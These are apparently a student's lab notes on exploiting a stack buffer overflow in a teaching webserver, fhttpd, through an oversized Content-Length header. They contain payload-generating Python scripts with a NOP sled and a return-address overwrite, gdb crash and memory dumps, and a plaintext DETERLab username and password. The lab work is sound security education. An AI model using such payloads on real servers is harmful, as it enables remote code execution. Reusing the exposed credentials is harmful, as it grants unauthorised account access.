# Lab 2

## Part 1: Buffer Overflows -- The Webserver

### SSH

Login to DETERLab as an user:

```bash
ssh -L 8080:bpc090:8080 la136cr@users.deterlab.net
```

The password is: `kKpM8Mki!FPkig!`

Then you can ssh to experiment instance:

```bash
ssh server.la136cr-lab2.UCLA136.isi.deterlab.net
```

### Running fhttpd Manually

Run:

```
cd /usr/local/fhttpd/
sudo ./fhttpd 8080
```

Then, open your browser and go to `localhost:8080`.

## Remove Execution

Reference:

- https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
- https://samsclass.info/127/proj/ED402.htm
- https://www.codeproject.com/Articles/5165534/Basic-x86-64bit-Buffer-Overflows-in-Linux

Summary: Use buffer overflow to modify the return address so that when the function ends, it doesn't return to its caller but to the malicious code we injected.

We will attempt to exploit `get_header()` using `Content-Length`. First, create `payload.py` that outputs the payload.

```Python
import sys


def generate_malicious_content_length():
    return 'A' * 1200


sys.stdout.write('POST / HTTP/1.1\r\n')
sys.stdout.write('Content-Length: ' +
                 generate_malicious_content_length() + '\r\n')
sys.stdout.write('\r\n')
sys.stdout.write('hello\r\n')
```

Create the payload.

```bash
python payload.py > payload1
```

Let's try to see what exactly happened in part 1 in terms of the memory. Go to `/usr/local/fhttpd` and start the server in debug mode.

```bash
cd /usr/local/fhttpd
gdb fhttpd
run 8081
```

Exploit the server just like we did in part 1.

```bash
./exploit1.sh
```

You will get segmentation fault.

```
(gdb) run 8081
Starting program: /usr/local/fhttpd/fhttpd 8081
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff75b0700 (LWP 20499)]

Thread 2 "fhttpd" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff75b0700 (LWP 20499)]
0x0000555555555663 in get_header (req=0x7ffff75afe60, headername=0x555555556b39 "Content-Length") at server/webserver.c:104
104     }
```

Check what's inside the registers.

```
info registers
```

You will get something like this:

```
(gdb) info registers
rax            0x7ffff0011bf0   140737219992560
rbx            0x4141414141414141       4702111234474983745
rcx            0x7ffff75af9d0   140737343322576
rdx            0x7ffff0011bf0   140737219992560
rsi            0x7ffff75af9d0   140737343322576
rdi            0x7ffff0011bf0   140737219992560
rbp            0x4141414141414141       0x4141414141414141
rsp            0x7ffff75afe38   0x7ffff75afe38
r8             0x4      4
r9             0x0      0
r10            0x7ffff00008d0   140737219922128
r11            0x1      1
r12            0x4141414141414141       4702111234474983745
r13            0x4141414141414141       4702111234474983745
r14            0x4141414141414141       4702111234474983745
r15            0x4141414141414141       4702111234474983745
rip            0x555555555663   0x555555555663 <get_header+501>
```

Check `get_header()` assembly code

```bash
disas get_header
```

You should see something like this:

```
Dump of assembler code for function get_header:
   0x000000000000146e <+0>:     push   %rbp
   0x000000000000146f <+1>:     mov    %rsp,%rbp
   0x0000000000001472 <+4>:     push   %r15
   0x0000000000001474 <+6>:     push   %r14
   0x0000000000001476 <+8>:     push   %r13
   0x0000000000001478 <+10>:    push   %r12
   0x000000000000147a <+12>:    push   %rbx
   0x000000000000147b <+13>:    sub    $0x448,%rsp
   0x0000000000001482 <+20>:    mov    %rdi,-0x468(%rbp)
   0x0000000000001489 <+27>:    mov    %rsi,-0x470(%rbp)
   0x0000000000001490 <+34>:    mov    %rsp,%rax
   0x0000000000001493 <+37>:    mov    %rax,%rbx
   0x0000000000001496 <+40>:    movq   $0x0,-0x38(%rbp)
   0x000000000000149e <+48>:    mov    -0x470(%rbp),%rax
   0x00000000000014a5 <+55>:    mov    %rax,%rdi
---Type <return> to continue, or q <return> to quit---
   0x00000000000014a8 <+58>:    callq  0xf70 <strlen@plt>
   0x00000000000014ad <+63>:    add    $0x5,%rax
   0x00000000000014b1 <+67>:    mov    %rax,%rdx
   0x00000000000014b4 <+70>:    sub    $0x1,%rdx
   0x00000000000014b8 <+74>:    mov    %rdx,-0x40(%rbp)
   0x00000000000014bc <+78>:    mov    %rax,%r14
   0x00000000000014bf <+81>:    mov    $0x0,%r15d
   0x00000000000014c5 <+87>:    mov    %rax,%r12
   0x00000000000014c8 <+90>:    mov    $0x0,%r13d
   0x00000000000014ce <+96>:    mov    $0x10,%edx
   0x00000000000014d3 <+101>:   sub    $0x1,%rdx
   0x00000000000014d7 <+105>:   add    %rdx,%rax
   0x00000000000014da <+108>:   mov    $0x10,%ecx
   0x00000000000014df <+113>:   mov    $0x0,%edx
   0x00000000000014e4 <+118>:   div    %rcx
   0x00000000000014e7 <+121>:   imul   $0x10,%rax,%rax
---Type <return> to continue, or q <return> to quit---
   0x00000000000014eb <+125>:   sub    %rax,%rsp
   0x00000000000014ee <+128>:   mov    %rsp,%rax
   0x00000000000014f1 <+131>:   add    $0x0,%rax
   0x00000000000014f5 <+135>:   mov    %rax,-0x48(%rbp)
   0x00000000000014f9 <+139>:   mov    -0x48(%rbp),%rax
   0x00000000000014fd <+143>:   movw   $0xa0d,(%rax)
   0x0000000000001502 <+148>:   movb   $0x0,0x2(%rax)
   0x0000000000001506 <+152>:   mov    -0x48(%rbp),%rax
   0x000000000000150a <+156>:   mov    -0x470(%rbp),%rdx
   0x0000000000001511 <+163>:   mov    %rdx,%rsi
   0x0000000000001514 <+166>:   mov    %rax,%rdi
   0x0000000000001517 <+169>:   callq  0x1150 <strcat@plt>
   0x000000000000151c <+174>:   mov    -0x48(%rbp),%rdx
   0x0000000000001520 <+178>:   mov    %rdx,%rax
   0x0000000000001523 <+181>:   mov    $0xffffffffffffffff,%rcx
   0x000000000000152a <+188>:   mov    %rax,%rsi
---Type <return> to continue, or q <return> to quit---
   0x000000000000152d <+191>:   mov    $0x0,%eax
   0x0000000000001532 <+196>:   mov    %rsi,%rdi
   0x0000000000001535 <+199>:   repnz scas %es:(%rdi),%al
   0x0000000000001537 <+201>:   mov    %rcx,%rax
   0x000000000000153a <+204>:   not    %rax
   0x000000000000153d <+207>:   sub    $0x1,%rax
   0x0000000000001541 <+211>:   add    %rdx,%rax
   0x0000000000001544 <+214>:   movw   $0x203a,(%rax)
   0x0000000000001549 <+219>:   movb   $0x0,0x2(%rax)
   0x000000000000154d <+223>:   mov    -0x48(%rbp),%rdx
   0x0000000000001551 <+227>:   mov    -0x468(%rbp),%rax
   0x0000000000001558 <+234>:   mov    0x18(%rax),%rax
   0x000000000000155c <+238>:   mov    %rdx,%rsi
   0x000000000000155f <+241>:   mov    %rax,%rdi
   0x0000000000001562 <+244>:   callq  0x1190 <strstr@plt>
   0x0000000000001567 <+249>:   mov    %rax,-0x50(%rbp)
---Type <return> to continue, or q <return> to quit---
   0x000000000000156b <+253>:   cmpq   $0x0,-0x50(%rbp)
   0x0000000000001570 <+258>:   je     0x164e <get_header+480>
   0x0000000000001576 <+264>:   mov    -0x48(%rbp),%rax
   0x000000000000157a <+268>:   mov    %rax,%rdi
   0x000000000000157d <+271>:   callq  0xf70 <strlen@plt>
   0x0000000000001582 <+276>:   add    %rax,-0x50(%rbp)
   0x0000000000001586 <+280>:   mov    -0x50(%rbp),%rax
   0x000000000000158a <+284>:   lea    0x142d(%rip),%rsi        # 0x29be
   0x0000000000001591 <+291>:   mov    %rax,%rdi
   0x0000000000001594 <+294>:   callq  0x1190 <strstr@plt>
   0x0000000000001599 <+299>:   mov    %rax,-0x58(%rbp)
   0x000000000000159d <+303>:   cmpq   $0x0,-0x58(%rbp)
   0x00000000000015a2 <+308>:   je     0x161f <get_header+433>
   0x00000000000015a4 <+310>:   mov    -0x58(%rbp),%rdx
   0x00000000000015a8 <+314>:   mov    -0x50(%rbp),%rax
   0x00000000000015ac <+318>:   sub    %rax,%rdx
---Type <return> to continue, or q <return> to quit---
   0x00000000000015af <+321>:   mov    %rdx,%rax
   0x00000000000015b2 <+324>:   mov    %rax,%rdx
   0x00000000000015b5 <+327>:   mov    -0x50(%rbp),%rcx
   0x00000000000015b9 <+331>:   lea    -0x460(%rbp),%rax
   0x00000000000015c0 <+338>:   mov    %rcx,%rsi
   0x00000000000015c3 <+341>:   mov    %rax,%rdi
   0x00000000000015c6 <+344>:   callq  0x1060 <memcpy@plt>
   0x00000000000015cb <+349>:   mov    -0x58(%rbp),%rdx
   0x00000000000015cf <+353>:   mov    -0x50(%rbp),%rax
   0x00000000000015d3 <+357>:   sub    %rax,%rdx
   0x00000000000015d6 <+360>:   mov    %rdx,%rax
   0x00000000000015d9 <+363>:   movb   $0x0,-0x460(%rbp,%rax,1)
   0x00000000000015e1 <+371>:   lea    -0x460(%rbp),%rax
   0x00000000000015e8 <+378>:   mov    %rax,%rdi
   0x00000000000015eb <+381>:   callq  0xf70 <strlen@plt>
   0x00000000000015f0 <+386>:   mov    %eax,-0x5c(%rbp)
---Type <return> to continue, or q <return> to quit---
   0x00000000000015f3 <+389>:   mov    -0x5c(%rbp),%eax
   0x00000000000015f6 <+392>:   add    $0x1,%eax
   0x00000000000015f9 <+395>:   cltq
   0x00000000000015fb <+397>:   mov    %rax,%rdi
   0x00000000000015fe <+400>:   callq  0x10b0 <malloc@plt>
   0x0000000000001603 <+405>:   mov    %rax,-0x38(%rbp)
   0x0000000000001607 <+409>:   lea    -0x460(%rbp),%rdx
   0x000000000000160e <+416>:   mov    -0x38(%rbp),%rax
   0x0000000000001612 <+420>:   mov    %rdx,%rsi
   0x0000000000001615 <+423>:   mov    %rax,%rdi
   0x0000000000001618 <+426>:   callq  0xf50 <strcpy@plt>
   0x000000000000161d <+431>:   jmp    0x164e <get_header+480>
   0x000000000000161f <+433>:   mov    -0x50(%rbp),%rax
   0x0000000000001623 <+437>:   mov    %rax,%rdi
   0x0000000000001626 <+440>:   callq  0xf70 <strlen@plt>
   0x000000000000162b <+445>:   add    $0x1,%rax
---Type <return> to continue, or q <return> to quit---
   0x000000000000162f <+449>:   mov    %rax,%rdi
   0x0000000000001632 <+452>:   callq  0x10b0 <malloc@plt>
   0x0000000000001637 <+457>:   mov    %rax,-0x38(%rbp)
   0x000000000000163b <+461>:   mov    -0x50(%rbp),%rdx
   0x000000000000163f <+465>:   mov    -0x38(%rbp),%rax
   0x0000000000001643 <+469>:   mov    %rdx,%rsi
   0x0000000000001646 <+472>:   mov    %rax,%rdi
   0x0000000000001649 <+475>:   callq  0xf50 <strcpy@plt>
   0x000000000000164e <+480>:   mov    -0x38(%rbp),%rax
   0x0000000000001652 <+484>:   mov    %rbx,%rsp
   0x0000000000001655 <+487>:   lea    -0x28(%rbp),%rsp
   0x0000000000001659 <+491>:   pop    %rbx
   0x000000000000165a <+492>:   pop    %r12
   0x000000000000165c <+494>:   pop    %r13
   0x000000000000165e <+496>:   pop    %r14
   0x0000000000001660 <+498>:   pop    %r15
---Type <return> to continue, or q <return> to quit---
   0x0000000000001662 <+500>:   pop    %rbp
   0x0000000000001663 <+501>:   retq
End of assembler dump.
```

Place a breakpoint at `memcpy`.

```
break * get_header+344
```

Exploit again. This time you will hit the breakpoint.

```
(gdb) run 8081
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /usr/local/fhttpd/fhttpd 8081
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff75b0700 (LWP 22566)]
[Switching to Thread 0x7ffff75b0700 (LWP 22566)]

Thread 2 "fhttpd" hit Breakpoint 1, 0x00005555555555c6 in get_header (req=0x7ffff75afe60, headername=0x555555556b39 "Content-Length") at server/webserver.c:92
92                              memcpy((char *)hdrval, hdrptr, (hdrend - hdrptr));
```

Check what are inside `rsp` and `rbp`.

```
(gdb) x $rsp
0x7ffff75af9a0: 0x6f430a0d
(gdb) x $rbp
0x7ffff75afe30: 0xf75afef0
```

```
x/400x $rsp
```

```
0x7ffff75af9a0: 0x6f430a0d      0x6e65746e      0x654c2d74      0x6874676e
0x7ffff75af9b0: 0x0000203a      0x00000000      0x555554ad      0x00005555
0x7ffff75af9c0: 0x55556b39      0x00005555      0xf75afe60      0x00007fff
0x7ffff75af9d0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75af9e0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75af9f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa30: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa40: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa50: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afa70: 0x00000000      0x00000000      0xf7de4914      0x00007fff
0x7ffff75afa80: 0x00000000      0x00000000      0xf7ffe170      0x00007fff
0x7ffff75afa90: 0x00000000      0x00000000      0xf7dde12f      0x00007fff
0x7ffff75afaa0: 0xf7feb000      0x00007fff      0x00000000      0x00000000
0x7ffff75afab0: 0x00000000      0x00000000      0xf79f39d0      0x00007fff
---Type <return> to continue, or q <return> to quit---
0x7ffff75afac0: 0x02a10a06      0x00000000      0xf77c60de      0x00007fff
0x7ffff75afad0: 0xf77c42c0      0x00007fff      0xf79e3a6c      0x00007fff
0x7ffff75afae0: 0x00000002      0x00007fff      0x00000000      0x00000000
0x7ffff75afaf0: 0xf75afbf0      0x00007fff      0x00000003      0x00000000
0x7ffff75afb00: 0xf75afbe0      0x00007fff      0x00000000      0x00000000
0x7ffff75afb10: 0xf7feba58      0x00007fff      0x00000000      0x00000000
0x7ffff75afb20: 0x00000004      0x00000000      0xf7feb000      0x00007fff
0x7ffff75afb30: 0x00000000      0x00000000      0xa8428197      0x00000000
0x7ffff75afb40: 0xf7feb848      0x00007fff      0xf75afc88      0x00007fff
0x7ffff75afb50: 0xf7febf88      0x00007fff      0xf7feb4f0      0x00007fff
0x7ffff75afb60: 0x00000000      0x00000000      0xf7dde3bf      0x00007fff
0x7ffff75afb70: 0x00000001      0x00000000      0xf7febf88      0x00007fff
0x7ffff75afb80: 0x00000005      0x00000000      0x00000000      0x00000000
0x7ffff75afb90: 0x00000001      0x00000000      0xf7feb4f0      0x00007fff
0x7ffff75afba0: 0xf77c60de      0x00007fff      0x00000000      0x00000001
0x7ffff75afbb0: 0xf75afbe0      0x00007fff      0xf75afbf0      0x00007fff
0x7ffff75afbc0: 0xf7feb848      0x00007fff      0x00000000      0x00000000
0x7ffff75afbd0: 0x00000000      0x00000000      0x00000000      0x00000000
---Type <return> to continue, or q <return> to quit---
0x7ffff75afbe0: 0xffffffff      0x00000000      0x00000000      0x00000000
0x7ffff75afbf0: 0xf79ebf90      0x00007fff      0xf7feb000      0x00007fff
0x7ffff75afc00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afc10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afc20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afc30: 0x00000000      0x00000000      0xf79dd130      0x00007fff
0x7ffff75afc40: 0x00000000      0x00000000      0xf7a806ff      0x00007fff
0x7ffff75afc50: 0x00000000      0x00000000      0x5575a750      0x00005555
0x7ffff75afc60: 0xffffe2e0      0x00007fff      0xf7de3073      0x00007fff
0x7ffff75afc70: 0x00000005      0x00000000      0x00000000      0x00000000
0x7ffff75afc80: 0x00000000      0x00000000      0xf79ebf90      0x00007fff
0x7ffff75afc90: 0xf75afee0      0x00007fff      0xf7a806ff      0x00007fff
0x7ffff75afca0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afcb0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afcc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afcd0: 0x00000000      0x00000000      0x33323130      0x37363534
0x7ffff75afce0: 0x00003938      0x00000000      0x00000000      0x00000000
0x7ffff75afcf0: 0x00000000      0x00000000      0x00000000      0x00000000
---Type <return> to continue, or q <return> to quit---
0x7ffff75afd00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afd10: 0x00000000      0x00000000      0x000004c4      0x00000000
0x7ffff75afd20: 0x00000000      0x00000043      0x00000007      0x00000000
0x7ffff75afd30: 0x00000000      0x00000000      0xf0000b28      0x00007fff
0x7ffff75afd40: 0x000004f0      0x00000000      0xffffffb0      0xffffffff
0x7ffff75afd50: 0x00000013      0x00000000      0x0000004d      0x00000043
0x7ffff75afd60: 0x00000002      0x00000000      0x00000000      0x00000000
0x7ffff75afd70: 0x00000000      0x00000000      0x0000007c      0x00000077
0x7ffff75afd80: 0x0000006e      0x0000005d      0xf00005d0      0x00007fff
0x7ffff75afd90: 0x00000000      0x00000000      0x000004c4      0x00000000
0x7ffff75afda0: 0xf0000020      0x00007fff      0xf75affc0      0x00007fff
0x7ffff75afdb0: 0x00000000      0x00000000      0x5575a750      0x00005555
0x7ffff75afdc0: 0xffffe2e0      0x00007fff      0xf7a793cd      0x00007fff
0x7ffff75afdd0: 0xf00120cf      0x00007fff      0xf0011be2      0x00007fff
0x7ffff75afde0: 0xf0011732      0x00007fff      0xf75af9a0      0x00007fff
0x7ffff75afdf0: 0x00000012      0x00000000      0x00000000      0x00000000
0x7ffff75afe00: 0xf00120c0      0x00007fff      0xf75afe50      0x00007fff
0x7ffff75afe10: 0xf75affc0      0x00007fff      0x00000000      0x00000000
---Type <return> to continue, or q <return> to quit---
0x7ffff75afe20: 0x5575a750      0x00005555      0xffffe2e0      0x00007fff
0x7ffff75afe30: 0xf75afef0      0x00007fff      0x5555669c      0x00005555
0x7ffff75afe40: 0x6c65680a      0x00000000      0x00000000      0x00000000
0x7ffff75afe50: 0x00000000      0x00000000      0x5575a750      0x00005555
0x7ffff75afe60: 0x5575a750      0x00005555      0xf0000b20      0x00007fff
0x7ffff75afe70: 0xf0011700      0x00007fff      0xf0011720      0x00007fff
0x7ffff75afe80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afe90: 0xf0012591      0x00007fff      0x00000000      0x00000004
0x7ffff75afea0: 0xf00120c0      0x00007fff      0xf75afe40      0x00007fff
0x7ffff75afeb0: 0x00000004      0x00000000      0x00000000      0x00000005
0x7ffff75afec0: 0x00000004      0x00000000      0x00000001      0x00000000
0x7ffff75afed0: 0xf00120c0      0x00007fff      0x000004d8      0x000000c8
0x7ffff75afee0: 0xf75b0700      0x00007fff      0x00000000      0x00000000
0x7ffff75afef0: 0x00000000      0x00000000      0xf77ca6db      0x00007fff
0x7ffff75aff00: 0x00000000      0x00000000      0xf75b0700      0x00007fff
0x7ffff75aff10: 0xf75b0700      0x00007fff      0xd49c2077      0x299e3577
0x7ffff75aff20: 0xf75affc0      0x00007fff      0x00000000      0x00000000
0x7ffff75aff30: 0x5575a750      0x00005555      0xffffe2e0      0x00007fff
---Type <return> to continue, or q <return> to quit---
0x7ffff75aff40: 0x2a9c2077      0xd661dbc2      0x99d82077      0xd661db8e
0x7ffff75aff50: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff70: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff90: 0x00000000      0x00000000      0x77684100      0xb8934e97
0x7ffff75affa0: 0x00000000      0x00000000      0xf75b0700      0x00007fff
0x7ffff75affb0: 0x5575a750      0x00005555      0xf7b0371f      0x00007fff
0x7ffff75affc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75affd0: 0x00000000      0x00000000      0x00000000      0x00000000
```

```
nexti
x/400x $rsp
```

```
0x7ffff75af9a0: 0x6f430a0d      0x6e65746e      0x654c2d74      0x6874676e
0x7ffff75af9b0: 0x0000203a      0x00000000      0x555554ad      0x00005555
0x7ffff75af9c0: 0x55556b39      0x00005555      0xf75afe60      0x00007fff
0x7ffff75af9d0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75af9e0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75af9f0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa00: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa10: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa20: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa80: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afa90: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afaa0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afab0: 0x41414141      0x41414141      0x41414141      0x41414141
---Type <return> to continue, or q <return> to quit---
0x7ffff75afac0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afad0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afae0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afaf0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb00: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb10: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb20: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb80: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afb90: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afba0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afbb0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afbc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afbd0: 0x41414141      0x41414141      0x41414141      0x41414141
---Type <return> to continue, or q <return> to quit---
0x7ffff75afbe0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afbf0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc00: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc10: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc20: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc80: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afc90: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afca0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afcb0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afcc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afcd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afce0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afcf0: 0x41414141      0x41414141      0x41414141      0x41414141
---Type <return> to continue, or q <return> to quit---
0x7ffff75afd00: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd10: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd20: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd80: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afd90: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afda0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afdb0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afdc0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afdd0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afde0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afdf0: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe00: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe10: 0x41414141      0x41414141      0x41414141      0x41414141
---Type <return> to continue, or q <return> to quit---
0x7ffff75afe20: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe30: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe40: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe50: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe60: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe70: 0x41414141      0x41414141      0x41414141      0x41414141
0x7ffff75afe80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75afe90: 0xf0012591      0x00007fff      0x00000000      0x00000004
0x7ffff75afea0: 0xf00120c0      0x00007fff      0xf75afe40      0x00007fff
0x7ffff75afeb0: 0x00000004      0x00000000      0x00000000      0x00000005
0x7ffff75afec0: 0x00000004      0x00000000      0x00000001      0x00000000
0x7ffff75afed0: 0xf00120c0      0x00007fff      0x000004d8      0x000000c8
0x7ffff75afee0: 0xf75b0700      0x00007fff      0x00000000      0x00000000
0x7ffff75afef0: 0x00000000      0x00000000      0xf77ca6db      0x00007fff
0x7ffff75aff00: 0x00000000      0x00000000      0xf75b0700      0x00007fff
0x7ffff75aff10: 0xf75b0700      0x00007fff      0xd49c2077      0x299e3577
0x7ffff75aff20: 0xf75affc0      0x00007fff      0x00000000      0x00000000
0x7ffff75aff30: 0x5575a750      0x00005555      0xffffe2e0      0x00007fff
---Type <return> to continue, or q <return> to quit---
0x7ffff75aff40: 0x2a9c2077      0xd661dbc2      0x99d82077      0xd661db8e
0x7ffff75aff50: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff70: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75aff90: 0x00000000      0x00000000      0x77684100      0xb8934e97
0x7ffff75affa0: 0x00000000      0x00000000      0xf75b0700      0x00007fff
0x7ffff75affb0: 0x5575a750      0x00005555      0xf7b0371f      0x00007fff
0x7ffff75affc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff75affd0: 0x00000000      0x00000000      0x00000000      0x00000000
```

```
continue
x/3i $rip
```

```
(gdb) x/3i $rip
=> 0x555555555663 <get_header+501>:     retq
   0x555555555664 <http_version_str>:   push   %rbp
   0x555555555665 <http_version_str+1>: mov    %rsp,%rbp
```

```Python
import sys


def generate_malicious_content_length():
    nopsled = '\x90' * 100
    buf = '\xcc' * 200
    pad = 'X' * (1128 - 100 - len(buf))
    rip = 'ABCDEFGH'
    return nopsled + buf + pad + rip


sys.stdout.write('POST / HTTP/1.1\r\n')
sys.stdout.write('Content-Length: ' +
                 generate_malicious_content_length() + '\r\n')
sys.stdout.write('\r\n')
sys.stdout.write('hello\r\n')
```

```
break * get_header+501
```

```
x/120x 0x7ffff75af900
```

```
0x7ffff75af9c0: 0x55556b39      0x00005555      0xf75afe60      0x00007fff
0x7ffff75af9d0: 0x90909000      0x90909090      0x90909090      0x90909090
0x7ffff75af9e0: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffff75af9f0: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffff75afa00: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffff75afa10: 0x90909090      0x90909090      0x90909090      0x90909090
---Type <return> to continue, or q <return> to quit---
0x7ffff75afa20: 0x90909090      0x90909090      0x90909090      0x90909090
0x7ffff75afa30: 0x90909090      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afa40: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afa50: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afa60: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afa70: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afa80: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afa90: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afaa0: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afab0: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afac0: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0x7ffff75afad0: 0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
```

```Python
import sys


def generate_malicious_content_length():
    nopsled = '\x90' * 100
    buf = '\xcc' * 200
    pad = 'X' * (1128 - 100 - len(buf))
    rip = '\x41\x42\x43\x44\x45\x46\x47\x48'
    return nopsled + buf + pad + rip


sys.stdout.write('POST / HTTP/1.1\r\n')
sys.stdout.write('Content-Length: ' +
                 generate_malicious_content_length() + '\r\n')
sys.stdout.write('\r\n')
